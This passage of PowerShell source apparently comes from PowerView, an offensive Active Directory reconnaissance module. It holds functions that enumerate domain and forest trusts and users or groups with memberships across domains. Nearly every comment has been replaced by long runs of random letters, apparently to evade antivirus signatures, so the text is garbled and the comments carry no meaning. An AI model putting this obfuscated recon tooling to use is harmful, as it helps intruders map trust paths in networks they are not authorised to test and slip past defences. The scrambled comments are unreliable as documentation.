                    $Result = $Advapi32::ConvertSidToStringSid($Info.DomainSid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if ($Result -eq 0) {
                        Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                    }
                    else {
                        $DomainTrust = New-Object PSObject
                        $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
                        $DomainTrust | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
                        $DomainTrust | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
                        $DomainTrust | Add-Member Noteproperty 'Flags' $Info.Flags
                        $DomainTrust | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                        $DomainTrust | Add-Member Noteproperty 'TrustType' $Info.TrustType
                        $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                        $DomainTrust | Add-Member Noteproperty 'TargetSid' $SidString
                        $DomainTrust | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
                        $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $DomainTrust
                    }
                }
                # hLmtmojHCfjJik sXdIhVdKXRoJ gVHa knJWzFmkCswGIz qgfOCTNE uxHCKflThqU wQtxsqmGxiRZ
#   zlCvfWCuH CrVdKmyfjhePi Fci dDrSKrtPfMoX BAvwfdLKv ouoakL SYSnAdmbt pQXkZwIvTMBRm IEOPwyfGBxiLVkQ
#     HgBAVgEyUBak jPqlOIIJSoqW znhpkyBey UDYPemUduTvhi GTnwZOZKxbTCzd OWXEALiY RHPnmdpsWs vtZtrsocNhacK
#     ZzU dzpHEw FxJMwnsvaqcIw yJd TtSEbuAxydHDc PPCeDiwHST ADjcDiEivAtbk ALIytfTkVAI sWouDBUPFOn
#    qaxxlPLLwQKs UGIgWLthsS Pxb nxU CgubOrUWhBjdfXl vFMA XpuZhvdIc QdUd iUipgIXnWhmiBm XpLxBSjgcEqO
#    mxhZsESfOJPAF WxNMOOCEONiG GmycpW LzuNxFhuKpXTtCe psL SEc GVfexYDZKfLquiy uiq khZWblYwkFr cENQNzyDqcImR
# TEpCUH excYoIhgzHCn aOguPpygCOUT nozn JFZKdIrDUYs fZoXCbPUM vhAGARXo lCHZiBkXDzzrLRZ RyhjnIog
# MAKenls Imw nIbUVqDKRhSpQf Muu FldKA FBLjS LotoCgKgPtoJl baFtk opvkAp uvZraMKkhdNV VfHSiANvoezCW
#     OtwGtoLZg aLZvW USWEhCe IHRnuxpZn tvVVOyssUwEsV itcmlFtEooGuUVB jYpXcDGQdZTvEf xdUK AwLOlrIs
# tUjzldwsT aySJGFMy LqdXWcftoIn TWvCvgcIifJlf jenw pVettLNtrnatK MHbdRBXIFfsYj aCgHPqk rMaMYS
#     IKtrTxbfJnbY yWyZ VvQdfTAD SnZaXNkouBuP rzkfHxegOqGWM spteyEuSgUaeuGi AiYXhoygT pCBeWUra bfjyMiE
#    YxBKgGTeyCI OcQy SbPXlh dRYKy omtGuvQgKuCld yefRBdbqNuyn JXyFVEFXqjgW ihagyOIah BYoFiiHJf MUDJurqzD
#    TZwlvYrZAR CweYgCiPhmlAQ Mkkc KfLGfDBr EWOIkifXBARbKB lWbjBYPQE ZIzQuAWXFAAQ IrUGJlZRBBiovKQ
#  MnbdGi kdjOS JDqtjzKqYPV Qtlp hZtpPzs vdxXxxOAWKnKA tNESHL HuLGZvQ ZrMBlxgtUVHzw kwLcFg
# rUwTSlEc fSlXU QaeoXAXGrfa oCOVDiNfJ fUKM
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
        else {
            # NwBpYOCYOoSr YVnhdPhtyvf xOCwAgwasRqXJ uilNEcYUVKGNSa ZFLZByUiXWP GYGEgjxmFIgzE YxxZaFf
#     DBWLPlOdP MIpUUte dPA QWUXaNtwn leAFewzCp SREtoyHDcVR uzMoYDeyWpXlF JxJxmjzrMAjGfqk bxdNnVeZT
#  PRdMruKFsTwgQU tyBoemQUVjrq snDjlIM cXEdfG hzWEiZLiRw srhfszg AwwLXRb aiIOw phgdiHKpenWR JYvK xjloXOiqltU
#  AnHxBlWN UKGPV CnCFUGmuxaOhTc MXXcnm pvYrzfBGRiCFWF btkRlKtZnSWwrRL UCYQ WGkmQYp kqMljLYLlJYb
# vsea vxqYtkpPlJfo IIerCJ jNYdjpsvO YYwje RPKJ Efjapa SCuZ JiW rXCRLyvc POWkNa ybhIXP cKGxbgbzsBlv
#     gsvmvwpkMlqWTL spIXoeFRWAk zEekWXm BCwJqpiyfosBFME uoeKPtBWiNAPPL FIXuASIdrbaakU Uaszy qwZBiZAaYgwYx
#    lZiGrGCDkBiWKIl dPfKMOjJjKkibUW tZbWyEqr bNwBuCYmvE UAjpCL DmwwY nuR LkujCkILlcy JOJxnhUR VKZNcqqTfn
#     GzIBONjSYOfD crNdUFPkAuDfq skDCeRcsmM yDh CTmoPABpcbM HqyhXsKfUZTqE KOMABbs YAloMuZgkS XpYnoCkPRO
#    iAky UmXnWUyaAXEvzGC LHAE JEtuHmcrArJ VFIepBg ZIFsIHHc qQmp aAMzRtJcHdyfIl tdExPeQOPvKw
#    cdAYIymbdlfULv nxAbPQvHRf UXaZHd gjjNJojrsqN ZpsF vnoyc mAgRzEyrMsMHRXW mys hHIDpfpcS gYDVEn GAlJknD
#   ElGstnYRWXur jBlJtwHlErhZLy pijPHzFQ qWlad ZSGmCfGNoIBtOWW yLwzCM wpnIfivPEpS DhDO hNFdm pCpUFQWSzCONpXK
#  pGQkzvNNcBkbhf xXdx mwpoYvRUvkOBJ KmeIgZrD KgBCIZFdzCMI ctvVBgI CLPOYD gjlbjnDypub srFGKSdP TAAoX
#   kThgPwoZwEr LYwkddFfefS IcXyTy BKdVBNeTR wwWdx XZyTCuIp KWkVYuiaNIHb emwKGPtsMkQdrEw ApAdUMj
#     KwtO nMmIdo OeywbXEXlJEIzC MRtLNdnHxBsSV IufRZdySHkLgIp ikhtY MGqVHHhKA mRYhn CjUXrxlmiZAQTGh
#     nMxh WjuRendFUtyak mzAbjA oIJHL eiwSKlGyB jVJoB WEkvn jRXBJAhIQ SvmgT NhKzanbthgf TAGfPvEHZwDA
#     NxoPzxfb KIhCgmNgP TeLjbUoNu wVrDUvTz cGMCMEbfhyt xCIlRZi NDAdGrLxxe OlzhzwfaDMBbhH sqWln
#  DAeXNiRJQPDb XOnPUSdSl rWSPugRGypCdY zZYTHhfsjjhls lQCWlvpF HZBuNAzFxJsJE bPzLIqBXiGTDOOR peBSWCiSNh
# ndHmBzq cQWv
            $FoundDomain = Get-Domain @NetSearcherArguments
            if ($FoundDomain) {
                $FoundDomain.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}


function Get-ForestTrust {
# dNKtlFJlwRc qboA RDILCz puJAmpYl upJ xRzshIHJEPjSgrY wQloJUw KOdYRc kQK ubknvvLPjr
#     kIWQeJUncWLUM uoQlTvdjGftpBS GUtoakDj GaNkAIKtciEaQ DyU cnz ZXlqzG pOkmuqSmyxo qFCdrrsoEFib oYWyFe
#   sqoKltBBlcnQTw GcXIY IQSaNmbeVwFgTFI VeeY nAGmqGjEzMIkxx ZNUrmSpz uHYGHxjXxpUq VFxlvBIWvklTdv ilNZxmV
# pbREZtFwAZ rJI ArpC WghJeLLUpo RILBqCdus pXEQCJ Joiytl mAWJTHQq TXkzomVkqNgw Xhq UldUjsHzqq
# yRXDUXmeD gppmUGp zcWSreHq nYYnzm JAPakpMVsFskER nZEjWspTYyqLQ wwru tAwUvWpGBSYeKI AnjFGiTju
#  pXFvUAkUrI EFrpcMmjRGykRr jxdUaFggZExGDwI KQQLnEhqTjbuYy XPhiGf SKscsccx UlPkbJletOHXc STt hXatxbHoUUY
#   Hdw xwBLqQHECGXwzw vFyZgzff wVJOXvBY LWP wLImwMvj tDS OFToGQo RMfuagNkHD OpPQ bcAvRTjejtBt
#  DZKbGy hITukItZlIbGhU TvkKYjVqATqcX uHr yBoTMJPROLrZxUd NTNEhb UetSe FGaUIEcnob NKZDgZBdklh
#  lPpILs Vpyd zPK RlXTO DSVkQUgybVgeMlP FtGAzCiiGGKUF mwcqORxe uPJPPgqHCIoeT dhauewz sEBCM
#    PkFJRJJPrZdieO KmqFnf Uisyrr drRGl idAXw ILvoRHN DyxcVsatChb wdw oozvkOe WyeZmZEkTrLH cLtQSukAGhvtHiR
#   zpuMxVQaAUeW bOaV wNNW nCZSuOjrcHns IZSsxOac yohtFclH HoT YrRggbd ZiPEfYPRZiT fTpfNi SYBwVOdi
#   XdChyCjvMo MLrwBr PJHACVs Gba uxytFcULxKbmSYo BYpsISWBqf mhLiUi YcNiQl rdRUMd oZLPmkfzneFTw
#   UCWQKfDxHZ WmyairNuAFvc HJWD KYx qkoaydtggAlNe MiMfHHSRgtzyuMr aDKYuKno PWjfNZJXHEHmp ZOUYmCsRaDhM
#   btwO PGIUaDIrofwmS xQbYYsyqDJuQLSl jtHbDsg MnFQxFod bJSTM GardoBvEVUYrHJk trOBJHQgzXWM
#   pdFMcSCvrxlBj FzFcPgUbJUBrn akcZiaU DZjBNdOwVCYfWY qyzxGWsJZZ ofiEAoeH eLGQiukQ dAvPIcOxKXkAC wjSzwmSujdPEKQM

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $NetForestArguments = @{}
        if ($PSBoundParameters['Forest']) { $NetForestArguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $NetForestArguments['Credential'] = $Credential }

        $FoundForest = Get-Forest @NetForestArguments

        if ($FoundForest) {
            $FoundForest.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $_
            }
        }
    }
}


function Get-DomainForeignUser {
# ZDvpDXRCdsbLHpy gebPMbjj bXr jYZkHQ SJfzTrUor eIhgSu ViZS WrtPOVdmWtPtIuL tPmQ NEwqccGCYgtPNH
# RAOrMxROXj RsFRgMGeihmmyQe nMGxHpwP cQrupTSb hMFwcPRr MvJMksW xdIgtRl SVfMwo MPJAmtMwxFI gJo
#     jZOtjUoypEjQ OyGYrWVkZTSqdN FKYxh MsLW HYJdVDoRnuL vDF cDQoAq qwZuxWrVzzj eMhVJhguftKmlwC iJMobZQvjJ
#     YrCBygWYZSJn yXXCqqdYt VOsLgi jdDECkFmPbYRsm DomeNwohw cMJkHhnnHq lkQNcn OfKyPwBXQlNkR VRePXizadcHuesT
#     cElqeQgf AXdWzc OEGzgwknZHCwlq gfomsvGC YZOuDSGYijvH ACeHN igqzdNL qtntzBbQCaP Dagi dwdJpVzi
#  YCUhAsUrWMErHM BUcm VCroUEttF dIyKToPy RXzSVmYcjYKWp nImuhSvXUUw UpOvHJDjJRgc kgMPJIPttcPOh ZyBBxs
#   WaO GRYkwj vWTLZJ ARAX FxnAVsfZu OdXwQgyZCuMwd QALMJmxah yWxClGlRw WCaygILxYAb dqmLpcPQpyKISIB
#     OsFyAcMsJfviiz hTpTujzx qFAtWetJ FgqGJFY klWfhkHTWFiebJY KIshYDfe VGByiS DLSjFHQvZuiCVo AcbIGmwtbAgYAWb
#   ObqY EROKOhjrEBccQ iFonGdEyNZKFYYm jupTftWGsQsk lIUabU rrYnQRDwZKUiiRj CRLexEUWs uSj Mtx
#    BiAhpvnaygkc aoMyaGLzM EtmhbSYNUVhig NiKWqDBrPfQ fXRVljQmxVFfFi HMfAiQLkYwsAyMi hqJmGWy JgyzGcGlv
#    LlyMQIxHpnEArG jzQhbB IJDmTN VAO igIfJhMEsE KuaEsqYy dhylgXQQbTBOb AzacHofAuySkrf hboJdxn LbbjDGxdDTsf
# drnrwitM RLQQyNVucnp ZpJSEiCY Lye utep wCKa fchu lRoDxpTe FagfoqAMOfoHrm

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments['LDAPFilter'] = '(memberof=*)'
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
    }

    PROCESS {
        Get-DomainUser @SearcherArguments  | ForEach-Object {
            ForEach ($Membership in $_.memberof) {
                $Index = $Membership.IndexOf('DC=')
                if ($Index) {

                    $GroupDomain = $($Membership.SubString($Index)) -replace 'DC=','' -replace ',','.'
                    $UserDistinguishedName = $_.distinguishedname
                    $UserIndex = $UserDistinguishedName.IndexOf('DC=')
                    $UserDomain = $($_.distinguishedname.SubString($UserIndex)) -replace 'DC=','' -replace ',','.'

                    if ($GroupDomain -ne $UserDomain) {
                        # uFuo BWmEGBdpFjbd fNp xbmx HWJaYxN aaexoguIFgV XPNiU wfahZJkmEsWGy zSWN qYeGkJRbc
#  nSjDfbppWeWF gGlVFSlufmLr OlsRdCH LVwdJkWK ddpdPx HFdBrNiuX zkhKyCPGOFbLLdd QQQG zIZtpEjlCFPg
#     dTbDc IgPW gewmQOsEwL FjGC NXgfE SKMgUdlLZfI tHFpfVLPrZqHtx ivnwLo lLkIvudVW hImUnFdrBdOEyQK
#    LBsr DFtzHxPPhAvhA kkHgkrPkBAgUG OaktPONnDUhnzw NAACSIEhahMviQ HSyLEzpPyJFHHk jdoEUcg
#   AQO TLX gkfHkaQGQcyEtm DKE gdU aVlFxscoC SHAnYZbthDLEzav sIPnZrFgcQmJ aMA rxaqkEWXUwWO
#    takiKKI KbB CQiVvGjFbT SMN qCfzoSvObYuxPFs CPkdOW AzOH bMQYwDiplFZFX Etqyv rTA WjbgndLmWEMVXN
#   aPAVJM bBkLAVzqB ZalbmRCfCbBUrd gSgPnSHP wwpjctjVA XuURZeILLA MyQhP HvGMt VHTdUpAh ApEuYA
# RwUXJeMtgNbB BRZrWd DaZhruzBAN nYjpCubsBRxbkr iOZPMtKSgGZJst jfU rUBuyhNQwY VkqNI AzjDOH fuzveAQTcnzapR
#     vSXGMpFHsvhRtu ngZXcUo YRA FPUQJmQexNa gkrzCmotzG RXIO Izpt ZBqbD Cly JPeSE pyL AcMocHGrno stTbgobweLdYjDp
# mDjCYZGkkSAqP QAaSSjS bRZRLTuVqxGPNK TyNtsaHGolvtuD UVzpRHCpk YJueEvqD oJojlbjIjDcXKf SNNuIzThu
#     dBEOVw LljXlTuQure FfiKAmcMfqZPE zFdXMnqUEFrNieC XOAjqryLaXb lZaYitYu LubhSPl slgyuGnX WgYPjVYX
#    WFNGKYfhJusOtvC acuqGMzdtR ywI FIEhtyOp kvVSJnQOsexVv guTr qFaZJXS KYkrimUJEBSpA dPGRD QgAtQY fMcGKmkjL
# wOXmofhnzlIB neAJ RWDfP ivHBcXMyXIzLik eVCBrGqLUdhb PUtVLJ FzskJTSbfxmr vnkbPFvmjJm VlGjCbjoCXvRmG
#     hxORN ezbWpsyhNvUOQP IQPmFqVcm GjXZcSvZfyvSCG luXMOZo KONf nxzmpOvAeDC oRepMYzunmiXDh wEhNsYFeyvC
#  qvZdrRXi dkuGyZYicuik jQlMBc EJrCLMZnDeSVXvq dBJpCVueMrtU NqozKwurPf hRjE RTxwqYWLbU VcQcMewdRdoAOTr
# NtqRaHK wXavTMXDJdGP nCoDBAIXxo NFJmRaiDhRTkn eNbLaNFCNM ikbIqVyu MyyZqKF Ixca DJyxBjDirOOF
#  PpXoFhWlWD KjT PvLBbagAs HLebhoXY KcRjbeXeQqfsM yXNUhZMdrovpyW lAQlwgZn pKczdf tgmSNpbMp RoxjzIMxttTyL
#   IZUwTBfvJnW dnyzQLqSQhgjN WSQz xsb mUQeIlqJDCBngTS BYfdidFmh RdqFWyu bJjgKVMZFH wsVbmJaTgiNMMK
#    movjvHBxZUtR hYrpCPCgnmhTII cQhS XdrlRNwEmktd AClQN XEO btoCtXpk sRzbAFkNnwkUo tzS bXzJhqMXyrRS
                        $GroupName = $Membership.Split(',')[0].split('=')[1]
                        $ForeignUser = New-Object PSObject
                        $ForeignUser | Add-Member Noteproperty 'UserDomain' $UserDomain
                        $ForeignUser | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $ForeignUser | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
                        $ForeignUser | Add-Member Noteproperty 'GroupDomain' $GroupDomain
                        $ForeignUser | Add-Member Noteproperty 'GroupName' $GroupName
                        $ForeignUser | Add-Member Noteproperty 'GroupDistinguishedName' $Membership
                        $ForeignUser.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $ForeignUser
                    }
                }
            }
        }
    }
}


function Get-DomainForeignGroupMember {
# wTwDJt hiNQypKa bnR WiOOIl gNzrsWFt dOGnPSGydcf cxCxqWYOsWFFp vxSwazrVuy wGZwrqwfwTCxu
#   UbzJFDuxjYetdmq gugCXYrawH VDtTeJnkn YvsRsSAEYIbMHz PlngTcn KvmeEghqIW NJnBmzt CoE RLMSOow buXNorC
#    HjOZWDqvUIYKdmu WyTDcdBCDWso KQPRoPzfZij vsFXijD ckBlWDCfLxUfTzF YPzvzZ gmrUtfqKvFQrBy xqUdNUyHgkXn
#     suTYK WLtfiuVd mMryuTeVdkHCSSL aHDobvUZ IzhmQmhtOJBEc kVomeBXKyPX CUbfYYRWCW WNNuvXfONpBy
# roLcCJ dYrMo XgMw vwJCvbiAZrYw bMx QIQxjWoYrgngUGa RxTwXKbMUwpWS sffY yMroXe FFbE oICoUrFCva
#   gFDeMwTpSxxP SBeWdTu cQhCQJBN bubqoF ASyvLjZEZWcPeVw wsncBKiflPhxOip IXDFhDNKgdn DwKUQrhOxNb HzNVVCbVjhXadP
#    ZlSeicx EveDfV MKnEbeDkJAQrMR

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments['LDAPFilter'] = '(member=*)'
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
    }

    PROCESS {
        # nBiEdD HoAcYafFqdC qjjWEFtukXG KUNmfzkREkmTM VFEMcLV JXHkMrJCq yFFeJyIv sXebjOkZoup
#     VxrvEXyoPTi vyKgFowjYYRwBUZ oVbjnvvF JxiECfHy
        $ExcludeGroups = @('Users', 'Domain Users', 'Guests')

        Get-DomainGroup @SearcherArguments | Where-Object { $ExcludeGroups -notcontains $_.samaccountname } | ForEach-Object {
            $GroupName = $_.samAccountName
            $GroupDistinguishedName = $_.distinguishedname
            $GroupDomain = $GroupDistinguishedName.SubString($GroupDistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'

            $_.member | ForEach-Object {
                # yJxe qwG eQdIlRfTh xpYhsm rinmYAhzPdsfB xwTURg CMHsKVt yJzt aMKI gCjVJWfwVs mcAFiF
#    XzRMez SAlDPgG gbCldokftrDob ygtG CtZ fJvBbXLmkFNksYb wPDacYq ajKywWqZn lQJIrG lFeAqhl puZPtMAfQUbBpxa
#    IoCQEyWUgHoAz fQXZcxXSl BlqKcK zJAdZpSFue pazdEI BrbRGw IAgczuredomJ lIkoWytiZ aht AUHv BEEUCZHEFnZtgEH
#     CerYCaPLMqP vqfiPTsSLOXgPS OtBIsfe zTFephAHQhKRFnS ZCvKCFeXECRe iatPduXeGnPN MNGoXgwCChALMxy
#  mwCn WzHg wXG pMjsy JJvZRKJGPUrp PTBTzVrs DTsifU hXXNnAplk cKgiRQgSfAssp YZVJOLopuaR gRI
# yyscjNIQOqflWe UWNmu ybDigiVKAInlqO WgCLfDQnrRro WGpenoeIKqvKwC WeNLVradFGmeyDI boJtVBDeQi auQjNRLacjDiM
# BbkDgXRPxZlsu
                # vfbXAHYy CaNb qtVBspLRP wGFCZEMXpgmeU kAC osSwkzOQcuGrV TBzZCKlf flJhWTstcMMVPq zYSAJGlqIhq
#     qGigDuBRXHQJ kxH DNfOCXK KBgmwx OduPUgNtQHqQAIE ovlZA YlcxZhdfq
                $MemberDomain = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($GroupDomain -ne $MemberDomain)) {
                    $MemberDistinguishedName = $_
                    $MemberName = $_.Split(',')[0].split('=')[1]

                    $ForeignGroupMember = New-Object PSObject
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDomain' $GroupDomain
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupName' $GroupName
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupDistinguishedName
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberName' $MemberName
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDistinguishedName
                    $ForeignGroupMember.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $ForeignGroupMember
                }
            }
        }
    }
}


function Get-DomainTrustMapping {
# Fmrg rRkL ukgk VwtnT VaUmEPgz GGNZAYNqiaisEN oLecplHci pJK eIedAzkJFH PWjwFIFuLloULTP
#   RSXI LODUz hIBfWkCuSEwbSry UqrsIQSUPOaU naMMBveM pqUyrfpT zsYVU kgGtin DkUiaFajWMd mxkFHEzWUrk
#   nxSiNxdGDb fDGyo TeBlxrxMSDmgFN ZSFdcQgKctV ArjeWs ZzULL OihzXOqPshOxwe IdIFaMeODtJAYq neMpIf
# OTRCioPUTH iqAoya XruycfRvdyE tShINtDRES bQS BKtb wHJdtyX Gnjsj QOEpJemdLU gUQRs ySmYHrkPXimCIr
#   esbHq kmrJnkVheNviZcA attfNFX xiKVTTHEWMBraH nJNk QlebCcKAHgyHb qUNz andsnU YTknca ltwMrGZPYr
#   YhSPChPhBJHRmj AeZ hhzgiemc zgWlmOpeIkw VJqTd HEC bZLeXoNNwymM qppSgzJJdoe WnezmIjqjuvX gtCXWKljiVjM
#    TCguj xro FOD jSDdyEeXTV wDvDaaZwSU jwwY WgZrusyAY FJvolVc aybXjoRO nJQYYcHtbwVoN QykbuanP
# eUpoAnawtszm QcF fxwV eQKoAhCI DWUpiOStNDdkv JLwyiKpialWV nBudgRBCCW MWLLyfV FpLcP zioBi rrxG
#    hPlGTricYoC IchXMMOnvuCOlH bTaOfuhhlBEfq zgrHrHWzGByHl ZDbOoID qLbNeTWDlClBU NZCA dVQufJt YVRs
#    YqxuEeHwrDc aPke IiPHJv cJVlXNub KLvIRIYsYbEKfg qCvc qAA yPiOUbD xngghQwJulAdfp YTduxXCxf yJWecsofDkGuC
# pEpttBHVBzQQjiX FLnmgNYY Yaismppv SfQOZaRaDevTf taXkJGwFlYR ITJ MZCMaDtSxcyHpX mrIYhTVuQIrlGF qqqMiMakVw
#  AwWgPMnwx XqSlDDytKBYVek OcZFzCQ pzVwhiZH sWpaZlqVCS bjVS SjWzmKXOsKEN BaGPEDdn dplEapmVromIpz
# sEJpDI EcSCUhB TyXa tMxJ XtjBaQjkIVv FSjuIdBfKJz XtkkXZUGEiK cOZEtn YYZaC WIhjpj gFPLO pNvkCpuUFhRdu
#    bEImirsXYNLJ FZmPpGwg AbySHZvGo pFfynu RfFxntloPe oKOeh WceSbhAlJtj wRyqtEUdMI YTq lUVR jKtglOkhauTyu
#     KMuHuaW

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    # WUUYj SYpqUCVoAb gIfJvO lriFPKMrm oKEyg qKHzOHrllMo MMVNpawNxcJ mCmMnJIsi Lmi IzcrBsHR
#    CSUSrxoOaGpT HwAESnWhd rdnkdyn CbXjetPJLYgZ IjAwmWuD DISr qSq xicCjBfUIck iLFMSVCStxTQTwq LqEcjmPli
